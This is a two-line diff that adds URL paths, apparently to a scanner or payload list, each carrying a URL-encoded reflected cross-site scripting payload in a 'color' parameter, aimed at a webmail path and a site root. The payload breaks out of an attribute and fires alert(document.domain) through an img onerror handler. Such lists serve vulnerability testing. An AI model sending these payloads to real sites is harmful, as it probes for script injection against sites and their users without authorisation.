@@ -1,0 +1,2 @@
+/webmail/?color=%22%3e%3cimg%20src%20onerror%3dalert(document.domain)%3e%3c%22%27
+/?color=%22%3e%3cimg%20src%20onerror%3dalert(document.domain)%3e%3c%22%27
